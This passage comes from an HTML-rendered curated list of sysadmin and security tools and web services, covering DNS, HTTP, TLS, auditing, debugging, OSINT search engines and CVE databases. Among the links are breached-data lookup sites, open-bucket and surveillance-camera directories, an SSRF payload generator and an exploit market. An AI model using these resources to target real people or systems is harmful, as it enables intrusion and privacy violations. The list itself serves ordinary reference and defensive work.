href=https://github.com/subfinder/subfinder><b>subfinder</b></a> - is a subdomain discovery tool that discovers valid subdomains for websites.<br><a href=https://github.com/aboul3la/Sublist3r><b>sublist3r</b></a> - is a fast subdomains enumeration tool for penetration testers.<br><a href=https://github.com/OWASP/Amass><b>amass</b></a> - is tool that obtains subdomain names by scraping data sources, crawling web archives and more.<br><a href=https://github.com/google/namebench><b>namebench</b></a> - provides personalized DNS server recommendations based on your browsing history.<br><a href=https://github.com/blechschmidt/massdns><b>massdns</b></a> - is a high-performance DNS stub resolver for bulk lookups and reconnaissance.<br><a href=https://github.com/guelfoweb/knock><b>knock</b></a> - is a tool to enumerate subdomains on a target domain through a wordlist.<br><a href=https://github.com/jedisct1/dnscrypt-proxy><b>dnscrypt-proxy 2</b></a> - a flexible DNS proxy, with support for encrypted DNS protocols.<br><a href=https://github.com/dnsdb/dnsdbq><b>dnsdbq</b></a> - API client providing access to passive DNS database systems (pDNS at Farsight Security, CIRCL pDNS).<br><a href=https://github.com/looterz/grimd><b>grimd</b></a> - fast dns proxy, built to black-hole internet advertisements and malware servers.<br><h5><a class=header href=#network-http id=network-http>Network (HTTP)</a></h5><p><a href=https://curl.haxx.se/><b>Curl</b></a> - is a command line tool and library for transferring data with URLs.<br><a href=https://gitlab.com/davidjpeacock/kurly><b>kurly</b></a> - is an alternative to the widely popular curl program, written in Golang.<br><a href=https://github.com/jakubroztocil/httpie><b>HTTPie</b></a> - is an user-friendly HTTP client.<br><a href=https://github.com/asciimoo/wuzz><b>wuzz</b></a> - is an interactive cli tool for HTTP inspection.<br><a href=https://github.com/trimstray/htrace.sh><b>htrace.sh</b></a> - is a simple Swiss Army knife for http/https troubleshooting and profiling.<br><a href=https://github.com/reorx/httpstat><b>httpstat</b></a> - is a tool that visualizes curl statistics in a way of beauty and clarity.<br><a href=https://github.com/gchaincl/httplab><b>httplab</b></a> - is an interactive web server.<br><a href=https://lynx.browser.org/><b>Lynx</b></a> - is a text browser for the World Wide Web.<br><a href=https://github.com/dhamaniasad/HeadlessBrowsers><b>HeadlessBrowsers</b></a> - a list of (almost) all headless web browsers in existence.<br><a href=https://httpd.apache.org/docs/2.4/programs/ab.html><b>ab</b></a> - is a single-threaded command line tool for measuring the performance of HTTP web servers.<br><a href=https://www.joedog.org/siege-home/><b>siege</b></a> - is an http load testing and benchmarking utility.<br><a href=https://github.com/wg/wrk><b>wrk</b></a> - is a modern HTTP benchmarking tool capable of generating significant load.<br><a href=https://github.com/giltene/wrk2><b>wrk2</b></a> - is a constant throughput, correct latency recording variant of wrk.<br><a href=https://github.com/tsenart/vegeta><b>vegeta</b></a> - is a constant throughput, correct latency recording variant of wrk.<br><a href=https://github.com/codesenberg/bombardier><b>bombardier</b></a> - is a fast cross-platform HTTP benchmarking tool written in Go.<br><a href=https://github.com/cmpxchg16/gobench><b>gobench</b></a> - http/https load testing and benchmarking tool.<br><a href=https://github.com/rakyll/hey><b>hey</b></a> - HTTP load generator, ApacheBench (ab) replacement, formerly known as rakyll/boom.<br><a href=https://github.com/tarekziade/boom><b>boom</b></a> - is a script you can use to quickly smoke-test your web app deployment.<br><a href=https://github.com/shekyan/slowhttptest><b>SlowHTTPTest</b></a> - is a tool that simulates some Application Layer Denial of Service attacks by prolonging HTTP.<br><a href=https://github.com/OJ/gobuster><b>gobuster</b></a> - is a free and open source directory/file & DNS busting tool written in Go.<br><a href=https://github.com/ssllabs/ssllabs-scan><b>ssllabs-scan</b></a> - command-line reference-implementation client for SSL Labs APIs.<br><a href=https://github.com/mozilla/http-observatory><b>http-observatory</b></a> - Mozilla HTTP Observatory cli version.<br><h5><a class=header href=#ssl id=ssl>SSL</a></h5><p><a href=https://www.openssl.org/><b>openssl</b></a> - is a robust, commercial-grade, and full-featured toolkit for the TLS and SSL protocols.<br><a href=https://gnutls.org/manual/html_node/gnutls_002dcli-Invocation.html><b>gnutls-cli</b></a> - client program to set up a TLS connection to some other computer.<br><a href=https://github.com/nabla-c0d3/sslyze><b>sslyze</b></a> - fast and powerful SSL/TLS server scanning library.<br><a href=https://github.com/rbsec/sslscan><b>sslscan</b></a> - tests SSL/TLS enabled services to discover supported cipher suites.<br><a href=https://github.com/drwetter/testssl.sh><b>testssl.sh</b></a> - testing TLS/SSL encryption anywhere on any port.<br><a href=https://github.com/mozilla/cipherscan><b>cipherscan</b></a> - a very simple way to find out which SSL ciphersuites are supported by a target.<br><a href=http://www.tarsnap.com/spiped.html><b>spiped</b></a> - is a utility for creating symmetrically encrypted and authenticated pipes between socket addresses.<br><a href=https://github.com/certbot/certbot><b>Certbot</b></a> - is EFF's tool to obtain certs from Let's Encrypt and (optionally) auto-enable HTTPS on your server.<br><a href=https://github.com/FiloSottile/mkcert><b>mkcert</b></a> - simple zero-config tool to make locally trusted development certificates with any names you'd like.<br><a href=https://github.com/square/certstrap><b>certstrap</b></a> - tools to bootstrap CAs, certificate requests, and signed certificates.<br><a href=https://github.com/yassineaboukir/sublert><b>Sublert</b></a> - is a security and reconnaissance tool to automatically monitor new subdomains.<br><a href=https://github.com/trimstray/mkchain><b>mkchain</b></a> - open source tool to help you build a valid SSL certificate chain.<br><h5><a class=header href=#security id=security>Security</a></h5><p><a href=https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/5/html/deployment_guide/ch-selinux><b>SELinux</b></a> - provides a flexible Mandatory Access Control (MAC) system built into the Linux kernel.<br><a href=https://wiki.ubuntu.com/AppArmor><b>AppArmor</b></a> - proactively protects the operating system and applications from external or internal threats.<br><a href=https://github.com/grapheneX/grapheneX><b>grapheneX</b></a> - Automated System Hardening Framework.<br><a href=https://github.com/dev-sec/><b>DevSec Hardening Framework</b></a> - Security + DevOps: Automatic Server Hardening.<br><h5><a class=header href=#auditing-tools id=auditing-tools>Auditing Tools</a></h5><p><a href=https://www.ossec.net/><b>ossec</b></a> - actively monitoring all aspects of system activity with file integrity monitoring.<br><a href=https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/chap-system_auditing><b>auditd</b></a> - provides a way to track security-relevant information on your system.<br><a href=https://www.nongnu.org/tiger/><b>Tiger</b></a> - is a security tool that can be use both as a security audit and intrusion detection system.<br><a href=https://cisofy.com/lynis/><b>Lynis</b></a> - battle-tested security tool for systems running Linux, macOS, or Unix-based operating system.<br><a href=https://github.com/rebootuser/LinEnum><b>LinEnum</b></a> - scripted Local Linux Enumeration & Privilege Escalation Checks.<br><a href=https://github.com/installation/rkhunter><b>Rkhunter</b></a> - scanner tool for Linux systems that scans backdoors, rootkits and local exploits on your systems.<br><a href=https://github.com/hasherezade/pe-sieve><b>PE-sieve</b></a> - is a light-weight tool that helps to detect malware running on the system.<br><h5><a class=header href=#system-diagnosticsdebuggers id=system-diagnosticsdebuggers>System Diagnostics/Debuggers</a></h5><p><a href=https://github.com/strace/strace><b>strace</b></a> - diagnostic, debugging and instructional userspace utility for Linux.<br><a href=http://dtrace.org/blogs/about/><b>DTrace</b></a> - is a performance analysis and troubleshooting tool.<br><a href=https://en.wikipedia.org/wiki/Ltrace><b>ltrace</b></a> - is a library call tracer, used to trace calls made by programs to library functions.<br><a href=https://github.com/brainsmoke/ptrace-burrito><b>ptrace-burrito</b></a> - is a friendly wrapper around ptrace.<br><a href=https://github.com/brendangregg/perf-tools><b>perf-tools</b></a> - performance analysis tools based on Linux perf_events (aka perf) and ftrace.<br><a href=https://github.com/iovisor/bpftrace><b>bpftrace</b></a> - high-level tracing language for Linux eBPF.<br><a href=https://github.com/draios/sysdig><b>sysdig</b></a> - system exploration and troubleshooting tool with first class support for containers.<br><a href=http://www.valgrind.org/><b>Valgrind</b></a> - is an instrumentation framework for building dynamic analysis tools.<br><a href=https://github.com/gperftools/gperftools><b>gperftools</b></a> - high-performance multi-threaded malloc() implementation, plus some performance analysis tools.<br><a href=https://nicolargo.github.io/glances/><b>glances</b></a> - cross-platform system monitoring tool written in Python.<br><a href=https://github.com/hishamhm/htop><b>htop</b></a> - interactive text-mode process viewer for Unix systems. It aims to be a better 'top'.<br><a href=https://www.atoptool.nl/><b>atop</b></a> - ASCII performance monitor. Includes statistics for CPU, memory, disk, swap, network, and processes.<br><a href=https://en.wikipedia.org/wiki/Lsof><b>lsof</b></a> - displays in its output information about files that are opened by processes.<br><a href=http://www.brendangregg.com/flamegraphs.html><b>FlameGraph</b></a> - stack trace visualizer.<br><a href=https://github.com/zevv/lsofgraph><b>lsofgraph</b></a> - small utility to convert Unix lsof output to a graph showing FIFO and UNIX interprocess communication.<br><a href=https://github.com/mozilla/rr><b>rr</b></a> - is a lightweight tool for recording, replaying and debugging execution of applications.<br><a href=https://pcp.io/index.html><b>Performance Co-Pilot</b></a> - a system performance analysis toolkit.</br><a href=https://github.com/sharkdp/hexyl><b>hexyl</b></a> - a command-line hex viewer.<br><h5><a class=header href=#log-analyzers id=log-analyzers>Log Analyzers</a></h5><p><a href=https://github.com/rcoh/angle-grinder><b>angle-grinder</b></a> - slice and dice log files on the command line.<br><a href=https://lnav.org><b>lnav</b></a> - log file navigator with search and automatic refresh.<br><a href=https://goaccess.io/><b>GoAccess</b></a> - real-time web log analyzer and interactive viewer that runs in a terminal.<br><a href=https://github.com/lebinh/ngxtop><b>ngxtop</b></a> - real-time metrics for nginx server.<br><h5><a class=header href=#databases id=databases>Databases</a></h5><p><a href=https://github.com/xo/usql><b>usql</b></a> - universal command-line interface for SQL databases.<br><a href=https://github.com/dbcli/pgcli><b>pgcli</b></a> - postgres CLI with autocompletion and syntax highlighting.<br><a href=https://github.com/dbcli/mycli><b>mycli</b></a> - terminal client for MySQL with autocompletion and syntax highlighting.<br><a href=https://github.com/dbcli/litecli><b>litecli</b></a> - SQLite CLI with autocompletion and syntax highlighting.<br><a href=https://github.com/osquery/osquery><b>OSQuery</b></a> - is a SQL powered operating system instrumentation, monitoring, and analytics framework.<br><h5><a class=header href=#tor id=tor>TOR</a></h5><p><a href=https://github.com/GouveaHeitor/nipe><b>Nipe</b></a> - script to make Tor Network your default gateway.<br><a href=https://github.com/trimstray/multitor><b>multitor</b></a> - a tool that lets you create multiple TOR instances with a load-balancing.<br><h5><a class=header href=#messengersirc-clients id=messengersirc-clients>Messengers/IRC Clients</a></h5><p><a href=https://irssi.org><b>Irssi</b></a> - is a free open source terminal based IRC client.<br><a href=https://weechat.org/><b>WeeChat</b></a> - is an extremely extensible and lightweight IRC client.<br><h5><a class=header href=#other id=other>Other</a></h5><p><a href=https://github.com/skx/sysadmin-util><b>sysadmin-util</b></a> - tools for Linux/Unix sysadmins.<br><a href=http://inotify.aiken.cz/><b>incron</b></a> - is an inode-based filesystem notification technology.<br><a href=https://github.com/rgburke/grv><b>GRV</b></a> - is a terminal based interface for viewing Git repositories.<br><a href=https://jonas.github.io/tig/><b>Tig</b></a> - text-mode interface for Git.<br><a href=https://github.com/tldr-pages/tldr><b>tldr</b></a> - simplified and community-driven man pages.<br><a href=https://github.com/mholt/archiver><b>archiver</b></a> - easily create and extract .zip, .tar, .tar.gz, .tar.bz2, .tar.xz, .tar.lz4, .tar.sz, and .rar.<br><a href=https://github.com/tj/commander.js><b>commander.js</b></a> - minimal CLI creator in JavaScript.<br><a href=https://github.com/tomnomnom/gron><b>gron</b></a> - make JSON greppable!<br><h4><a class=header href=#gui-tools-a-hrefmiscellaneoushtmlanger-table-of-contentssuptocsupa id=gui-tools-a-hrefmiscellaneoushtmlanger-table-of-contentssuptocsupa>GUI Tools <a href=MISCELLANEOUS.html#anger-table-of-contents><sup>[TOC]</sup></a></a></h4><h5><a class=header href=#terminal-emulators id=terminal-emulators>Terminal emulators</a></h5><p><a href=https://github.com/Guake/guake><b>Guake</b></a> - is a dropdown terminal made for the GNOME desktop environment.<br><a href=https://gnometerminator.blogspot.com/p/introduction.html><b>Terminator</b></a> - is based on GNOME Terminal, useful features for sysadmins and other users.<br><a href=https://sw.kovidgoyal.net/kitty/><b>Kitty</b></a> - is a GPU based terminal emulator that supports smooth scrolling and images.<br><h5><a class=header href=#network-1 id=network-1>Network</a></h5><p><a href=https://www.wireshark.org/><b>Wireshark</b></a> - is the world’s foremost and widely-used network protocol analyzer.<br><a href=https://www.ettercap-project.org/><b>Ettercap</b></a> - is a comprehensive network monitor tool.<br><a href=https://etherape.sourceforge.io/><b>EtherApe</b></a> - is a graphical network monitoring solution.<br><a href=https://jmeter.apache.org/><b>JMeter™</b></a> - open source software to load test functional behavior and measure performance.<br><a href=https://github.com/locustio/locust><b>locust</b></a> - scalable user load testing tool written in Python.<br><h5><a class=header href=#browsers id=browsers>Browsers</a></h5><p><a href=https://www.torproject.org/><b>TOR Browser</b></a> - protect your privacy and defend yourself against network surveillance and traffic analysis.<br><h5><a class=header href=#password-managers id=password-managers>Password Managers</a></h5><p><a href=https://keepassxc.org/><b>KeePassXC</b></a> - store your passwords safely and auto-type them into your everyday websites and apps.<br><a href=https://www.enpass.io/><b>Enpass</b></a> - password manager and secure wallet.<br><h5><a class=header href=#messengersirc-clients-1 id=messengersirc-clients-1>Messengers/IRC Clients</a></h5><p><a href=https://hexchat.github.io/index.html><b>HexChat</b></a> - is an IRC client based on XChat.<br><a href=https://pidgin.im/><b>Pidgin</b></a> - is an easy to use and free chat client used by millions.<br><h5><a class=header href=#messengers-end-to-end-encryption id=messengers-end-to-end-encryption>Messengers (end-to-end encryption)</a></h5><p><a href=https://www.signal.org/><b>Signal</b></a> - is an encrypted communications app.<br><a href=https://wire.com/en/><b>Wire</b></a> - secure messaging, file sharing, voice calls and video conferences. All protected with end-to-end encryption.<br><a href=https://github.com/prof7bit/TorChat><b>TorChat</b></a> - decentralized anonymous instant messenger on top of Tor Hidden Services.<br><h5><a class=header href=#text-editors-1 id=text-editors-1>Text editors</a></h5><p><a href=https://www.sublimetext.com/3><b>Sublime Text</b></a> - is a lightweight, cross-platform code editor known for its speed, ease of use.<br><a href=https://code.visualstudio.com/><b>Visual Studio Code</b></a> - an open-source and free source code editor developed by Microsoft.<br><a href=https://atom.io/><b>Atom</b></a> - a hackable text editor for the 21st Century.<br><h4><a class=header href=#web-tools-a-hrefmiscellaneoushtmlanger-table-of-contentssuptocsupa id=web-tools-a-hrefmiscellaneoushtmlanger-table-of-contentssuptocsupa>Web Tools <a href=MISCELLANEOUS.html#anger-table-of-contents><sup>[TOC]</sup></a></a></h4><h5><a class=header href=#browsers-1 id=browsers-1>Browsers</a></h5><p><a href=https://www.ssllabs.com/ssltest/viewMyClient.html><b>SSL/TLS Capabilities of Your Browser</b></a> - test your browser's SSL implementation.<br><a href=https://caniuse.com/><b>Can I use</b></a> - provides up-to-date browser support tables for support of front-end web technologies.<br><a href=https://panopticlick.eff.org/><b>Panopticlick 3.0</b></a> - is your browser safe against tracking?<br><a href=https://privacy.net/analyzer/><b>Privacy Analyzer</b></a> - see what data is exposed from your browser.<br><a href=https://browserleaks.com/><b>Web Browser Security</b></a> - it's all about Web Browser fingerprinting.<br><a href=https://www.howsmyssl.com/><b>How's My SSL?</b></a> - help a web server developer learn what real world TLS clients were capable of.<br><a href=https://suche.org/sslClientInfo><b>sslClientInfo</b></a> - client test (incl TLSv1.3 information).<br><h5><a class=header href=#sslsecurity id=sslsecurity>SSL/Security</a></h5><p><a href=https://www.ssllabs.com/ssltest/><b>SSLLabs Server Test</b></a> - free online service performs a deep analysis of the configuration of any SSL web server.<br><a href=https://dev.ssllabs.com/ssltest/><b>SSLLabs Server Test (DEV)</b></a> - free online service performs a deep analysis of the configuration of any SSL web server.<br><a href=https://www.immuniweb.com/ssl/><b>ImmuniWeb® SSLScan</b></a> - test SSL/TLS (PCI DSS, HIPAA and NIST).<br><a href=https://www.jitbit.com/sslcheck/><b>SSL Check</b></a> - scan your website for non-secure content.<br><a href=https://cryptcheck.fr/><b>CryptCheck</b></a> - test your TLS server configuration (e.g. ciphers).<br><a href=https://urlscan.io/><b>urlscan.io</b></a> - service to scan and analyse websites.<br><a href=https://report-uri.com/home/tools><b>Report URI</b></a> - monitoring security policies like CSP and HPKP.<br><a href=https://csp-evaluator.withgoogle.com/><b>CSP Evaluator</b></a> - allows developers and security experts to check if a Content Security Policy.<br><a href=https://uselesscsp.com/><b>Useless CSP</b></a> - public list about CSP in some big players (might make them care a bit more).<br><a href=https://whynohttps.com/><b>Why No HTTPS?</b></a> - list of the world's top 100 websites by Alexa rank not automatically redirecting insecure requests.<br><a href=https://cipherli.st/><b>cipherli.st</b></a> - strong ciphers for Apache, Nginx, Lighttpd and more.<br><a href=https://2ton.com.au/dhtool/><b>dhtool</b></a> - public Diffie-Hellman parameter service/tool.<br><a href=https://badssl.com/><b>badssl.com</b></a> - memorable site for testing clients against bad SSL configs.<br><a href=https://tlsfun.de/><b>tlsfun.de</b></a> - registered for various tests regarding the TLS/SSL protocol.<br><a href=https://sslmate.com/caa/><b>CAA Record Helper</b></a> - generate a CAA policy.<br><a href=https://ccadb.org/resources><b>Common CA Database</b></a> - repository of information about CAs, and their root and intermediate certificates.<br><a href=https://certstream.calidog.io/><b>CERTSTREAM</b></a> - real-time certificate transparency log update stream.<br><a href=https://crt.sh/><b>crt.sh</b></a> - discovers certificates by continually monitoring all of the publicly known CT.<br><a href=https://www.hardenize.com/><b>Hardenize</b></a> - deploy the security standards.<br><a href=https://cryptcheck.fr/suite/><b>Cipher suite compatibility</b></a> - test TLS cipher suite compatibility.<br><a href=https://www.urlvoid.com/><b>urlvoid</b></a> - this service helps you detect potentially malicious websites.<br><a href=https://securitytxt.org/><b>security.txt</b></a> - a proposed standard (generator) which allows websites to define security policies.<br><a href=https://github.com/mozilla/ssl-config-generator><b>ssl-config-generator</b></a> - help you follow the Mozilla Server Side TLS configuration guidelines.<br><h5><a class=header href=#http-headers--web-linters id=http-headers--web-linters>HTTP Headers & Web Linters</a></h5><p><a href=https://securityheaders.com/><b>Security Headers</b></a> - analyse the HTTP response headers (with rating system to the results).<br><a href=https://observatory.mozilla.org/><b>Observatory by Mozilla</b></a> - set of tools to analyze your website.<br><a href=https://webhint.io/><b>webhint</b></a> - is a linting tool that will help you with your site's accessibility, speed, security and more.<br><h5><a class=header href=#dns id=dns>DNS</a></h5><p><a href=http://viewdns.info/><b>ViewDNS</b></a> - one source for free DNS related tools and information.<br><a href=https://dnslookup.org/><b>DNSLookup</b></a> - is an advanced DNS lookup tool.<br><a href=https://dnslytics.com/><b>DNSlytics</b></a> - online DNS investigation tool.<br><a href=https://dnsspy.io/><b>DNS Spy</b></a> - monitor, validate and verify your DNS configurations.<br><a href=https://zonemaster.iis.se/en/><b>Zonemaster</b></a> - helps you to control how your DNS works.<br><a href=http://leafdns.com/><b>Leaf DNS</b></a> - comprehensive DNS tester.<br><a href=https://findsubdomains.com/><b>Find subdomains online</b></a> - find subdomains for security assessment penetration test.<br><a href=https://dnsdumpster.com/><b>DNSdumpster</b></a> - dns recon & research, find & lookup dns records.<br><a href=https://dnstable.com/><b>DNS Table online</b></a> - search for DNS records by domain, IP, CIDR, ISP.<br><a href=https://intodns.com/><b>intoDNS</b></a> - DNS and mail server health checker.<br><a href=http://www.zonecut.net/dns/><b>DNS Bajaj</b></a> - check the delegation of your domain.<br><a href=https://www.buddyns.com/delegation-lab/><b>BuddyDNS Delegation LAB</b></a> - check, trace and visualize delegation of your domain.<br><a href=https://dnssec-debugger.verisignlabs.com/><b>dnssec-debugger</b></a> - DS or DNSKEY records validator.<br><a href=http://ptrarchive.com/><b>PTRarchive.com</b></a> - this site is responsible for the safekeeping of historical reverse DNS records.<br><a href=http://xip.io/><b>xip.io</b></a> - wildcard DNS for everyone.<br><a href=https://ceipam.eu/en/dnslookup.php><b>dnslookup (ceipam)</b></a> - one of the best DNS propagation checker (and not only).<br><a href=https://whatsmydns.com><b>What's My DNS</b></a> - DNS propagation checking tool.<br><h5><a class=header href=#mail id=mail>Mail</a></h5><p><a href=https://mxtoolbox.com/SuperTool.aspx><b>MX Toolbox</b></a> - all of your MX record, DNS, blacklist and SMTP diagnostics in one integrated tool.<br><a href=http://www.blacklistalert.org/><b>blacklistalert</b></a> - checks to see if your domain is on a Real Time Spam Blacklist.<br><a href=http://multirbl.valli.org/><b>MultiRBL</b></a> - complete IP check for sending Mailservers.<br><a href=https://dkimvalidator.com/><b>DKIM SPF & Spam Assassin Validator</b></a> - checks mail authentication and scores messages with Spam Assassin.<br><h5><a class=header href=#encodersdecoders-and-regex-testing id=encodersdecoders-and-regex-testing>Encoders/Decoders and Regex testing</a></h5><p><a href=https://www.url-encode-decode.com/><b>URL Encode/Decode</b></a> - tool from above to either encode or decode a string of text.<br><a href=https://uncoder.io/><b>Uncoder</b></a> - the online translator for search queries on log data.<br><a href=https://regex101.com/><b>Regex101</b></a> - online regex tester and debugger: PHP, PCRE, Python, Golang and JavaScript.<br><a href=https://regexr.com/><b>RegExr</b></a> - online tool to learn, build, & test Regular Expressions (RegEx / RegExp).<br><a href=https://www.regextester.com/><b>RegEx Testing</b></a> - online regex testing tool.<br><a href=https://www.regexpal.com/><b>RegEx Pal</b></a> - online regex testing tool + other tools.<br><a href=https://gchq.github.io/CyberChef/><b>The Cyber Swiss Army Knife</b></a> - a web app for encryption, encoding, compression and data analysis.<br><h5><a class=header href=#net-tools id=net-tools>Net-tools</a></h5><p><a href=https://toolbar.netcraft.com/site_report><b>Netcraft</b></a> - detailed report about the site, helping you to make informed choices about their integrity.<b>*</b><br><a href=https://www.ripe.net/><b>RIPE NCC</b></a> - not-for-profit membership association, a Regional Internet Registry and the secretariat for the RIPE.<br><a href=https://www.robtex.com/><b>Robtex</b></a> - uses various sources to gather public information about IP numbers, domain names, host names, routes etc.<br><a href=https://securitytrails.com/><b>Security Trails</b></a> - APIs for Security Companies, Researchers and Teams.<br><a href=https://tools.keycdn.com/curl><b>Online Curl</b></a> - curl test, analyze HTTP Response Headers.<br><a href=https://extendsclass.com/><b>Online Tools for Developers</b></a> - HTTP API tools, testers, encoders, converters, formatters, and other tools.<br><a href=https://ping.eu/><b>Ping.eu</b></a> - online Ping, Traceroute, DNS lookup, WHOIS and others.<br><a href=https://network-tools.com/><b>Network-Tools</b></a> - network tools for webmasters, IT technicians & geeks.<br><a href=https://riseup.net/><b>Riseup</b></a> - provides online communication tools for people and groups working on liberatory social change.<br><a href=https://www.virustotal.com/gui/home/upload><b>VirusTotal</b></a> - analyze suspicious files and URLs to detect types of malware.<br><h5><a class=header href=#privacy id=privacy>Privacy</a></h5><p><a href=https://www.privacytools.io/><b>privacytools.io</b></a> - provides knowledge and tools to protect your privacy against global mass surveillance.<br><a href=https://dnsprivacy.org/wiki/display/DP/DNS+Privacy+Test+Servers><b>DNS Privacy Test Servers</b></a> - DNS privacy recursive servers list (with a 'no logging' policy).<br><h5><a class=header href=#code-parsersplaygrounds id=code-parsersplaygrounds>Code parsers/playgrounds</a></h5><p><a href=https://www.shellcheck.net/><b>ShellCheck</b></a> - finds bugs in your shell scripts.<br><a href=https://explainshell.com/><b>explainshell</b></a> - get interactive help texts for shell commands.<br><a href=https://jsbin.com/?html,output><b>jsbin</b></a> - live pastebin for HTML, CSS & JavaScript and more.<br><a href=https://codesandbox.io/><b>CodeSandbox</b></a> - online code editor for web application development. Supports React, Vue, Angular, CxJS, Dojo, etc.<br><a href=http://sandbox.onlinephpfunctions.com/><b>PHP Sandbox</b></a> - test your PHP code with this code tester.<br><a href=https://www.repl.it/><b>Repl.it</b></a> - an instant IDE to learn, build, collaborate, and host all in one place.<br><h5><a class=header href=#performance id=performance>Performance</a></h5><p><a href=https://gtmetrix.com/><b>GTmetrix</b></a> - analyze your site’s speed and make it faster.<br><a href=https://performance.sucuri.net/><b>Sucuri loadtimetester</b></a> - test here the
performance of any of your sites from across the globe.<br><a href=https://tools.pingdom.com/><b>Pingdom Tools</b></a> - analyze your site’s speed around the world.<br><a href=https://pingme.io/><b>PingMe.io</b></a> - run website latency tests across multiple geographic regions.<br><a href=https://developers.google.com/speed/pagespeed/insights/><b>PageSpeed Insights</b></a> - analyze your site’s speed and make it faster.<br><a href=https://web.dev/><b>web.dev</b></a> - helps developers like you learn and apply the web's modern capabilities to your own sites and apps.<br><a href=https://github.com/GoogleChrome/lighthouse><b>Lighthouse</b></a> - automated auditing, performance metrics, and best practices for the web.<br><h5><a class=header href=#mass-scanners-search-engines id=mass-scanners-search-engines>Mass scanners (search engines)</a></h5><p><a href=https://censys.io/><b>Censys</b></a> - platform that helps information security practitioners discover, monitor, and analyze devices.<br><a href=https://www.shodan.io/><b>Shodan</b></a> - the world's first search engine for Internet-connected devices.<br><a href=https://2000.shodan.io/#/><b>Shodan 2000</b></a> - do you use Shodan for everyday work? This tool looks for randomly generated data from Shodan.<br><a href=https://viz.greynoise.io/table><b>GreyNoise</b></a> - mass scanner such as Shodan and Censys.<br><a href=https://www.zoomeye.org/><b>ZoomEye</b></a> - search engine for cyberspace that lets the user find specific network components.<br><a href=https://netograph.io/><b>netograph</b></a> - tools to monitor and understand deep structure of the web.<br><a href=https://fofa.so/><b>FOFA</b></a> - is a cyberspace search engine.<br><a href=https://www.onyphe.io/><b>onyphe</b></a> - is a search engine for open-source and cyber threat intelligence data collected.<br><a href=https://intelx.io/><b>IntelligenceX</b></a> - is a search engine and data archive.<br><a href=https://app.binaryedge.io/><b>binaryedge</b></a> - it scan the entire internet space and create real-time threat intelligence streams and reports.<br><a href=https://wigle.net/><b>wigle</b></a> - is a submission-based catalog of wireless networks. All the networks. Found by Everyone.<br><a href=https://publicwww.com/><b>PublicWWW</b></a> - find any alphanumeric snippet, signature or keyword in the web pages HTML, JS and CSS code.<br><a href=https://inteltechniques.com/menu.html><b>IntelTechniques</b></a> - this repository contains hundreds of online search utilities.<br><a href=https://hackle.dev/><b>Hackle</b></a> - search engine for hackers and security professionals.<b>*</b><br><a href=https://hunter.io/><b>hunter</b></a> - lets you find email addresses in seconds and connect with the people that matter for your business.<br><a href=https://ghostproject.fr/><b>GhostProject?</b></a> - search by full email address or username.<br><a href=https://www.databreaches.live/><b>databreaches</b></a> - was my email affected by data breach?<br><a href=https://weleakinfo.com><b>We Leak Info</b></a> - world's fastest and largest data breach search engine.<br><a href=https://pulsedive.com/><b>Pulsedive</b></a> - scans of malicious URLs, IPs, and domains, including port scans and web requests.<br><a href=https://scylla.sh><b>scylla</b></a> - db dumps and more.<br><a href=https://buckets.grayhatwarfare.com/><b>Buckets by Grayhatwarfar</b></a> - database with public search for Open Amazon S3 Buckets and their contents.<br><a href=https://vigilante.pw/><b>Vigilante.pw</b></a> - the breached database directory.<br><a href=https://builtwith.com/><b>builtwith</b></a> - find out what websites are built with.<br><a href=https://nerdydata.com/><b>NerdyData</b></a> - find where any technology is used, across millions of sites.<br><a href=https://www.mmnt.net/><b>Mamont's open FTP Index</b></a> - if a target has an open FTP site with accessible content it will be listed here.<br><a href=https://osintframework.com/><b>OSINT Framework</b></a> - focused on gathering information from free tools or resources.<br><a href=https://www.maltiverse.com/search><b>maltiverse</b></a> - is a service oriented to cybersecurity analysts for the advanced analysis of indicators of compromise.<br><a href=https://leakedsource.ru/main/><b>Leaked Source</b></a> - is a collaboration of data found online in the form of a lookup.<br><a href=https://search.weleakinfo.com/><b>We Leak Info</b></a> - to help everyday individuals secure their online life, avoiding getting hacked.<br><a href=https://pipl.com/><b>pipl</b></a> - is the place to find the person behind the email address, social username or phone number.<br><a href=https://abuse.ch/><b>abuse.ch</b></a> - is operated by a random swiss guy fighting malware for non-profit.<br><a href=http://malc0de.com/database/><b>malc0de</b></a> - malware search engine.<br><a href=https://cybercrime-tracker.net/index.php><b>Cybercrime Tracker</b></a> - monitors and tracks various malware families that are used to perpetrate cyber crimes.<br><a href=https://github.com/eth0izzle/shhgit/><b>shhgit</b></a> - find GitHub secrets in real time.<br><a href=https://nerdydata.com/><b>NerdyData</b></a> - search source code across 65 million websites.<br><a href=https://searchcode.com/><b>searchcode</b></a> - helping you find real world examples of functions, API's and libraries.<br><a href=http://www.insecam.org/><b>Insecam</b></a> - the world biggest directory of online surveillance security cameras.<br><a href=http://index-of.es/><b>index-of</b></a> - contains great stuff like: security, hacking, reverse engineering, cryptography, programming etc.<br><h5><a class=header href=#generators id=generators>Generators</a></h5><p><a href=https://thispersondoesnotexist.com/><b>thispersondoesnotexist</b></a> - generate fake faces in one click - endless possibilities.<br><a href=https://generated.photos><b>AI Generated Photos</b></a> - 100.000 AI generated faces.<br><a href=https://fakeface.co/><b>fakeface</b></a> - fake faces browser.<br><a href=https://tools.intigriti.io/redirector/><b>Intigriti Redirector</b></a> - open redirect/SSRF payload generator.<br><h5><a class=header href=#passwords id=passwords>Passwords</a></h5><p><a href=https://haveibeenpwned.com/><b>have i been pwned?</b></a> - check if you have an account that has been compromised in a data breach.<br><a href=https://www.dehashed.com/><b>dehashed</b></a> - is a hacked database search engine.<br><a href=https://leakedsource.ru/><b>Leaked Source</b></a> - is a collaboration of data found online in the form of a lookup.<br><h5><a class=header href=#cveexploits-databases id=cveexploits-databases>CVE/Exploits databases</a></h5><p><a href=https://cve.mitre.org/><b>CVE Mitre</b></a> - list of publicly known cybersecurity vulnerabilities.<br><a href=https://www.cvedetails.com/><b>CVE Details</b></a> - CVE security vulnerability advanced database.<br><a href=https://www.exploit-db.com/><b>Exploit DB</b></a> - CVE compliant archive of public exploits and corresponding vulnerable software.<br><a href=https://0day.today/><b>0day.today</b></a> - exploits market provides you the possibility to buy zero-day exploits and also to sell 0day exploits.<br><a href=https://sploitus.com/><b>sploitus</b></a> - the exploit and tools database.<br><a href=https://cxsecurity.com/exploit/><b>cxsecurity</b></a> - free vulnerability database.<br><a href=https://www.vulncode-db.com/><b>Vulncode-DB</b></a> - is a database for vulnerabilities and their corresponding source code if available.<br><a href=https://cveapi.com/><b>cveapi</b></a> - free API for CVE data.<br><h5><a class=header href=#mobile-apps-scanners 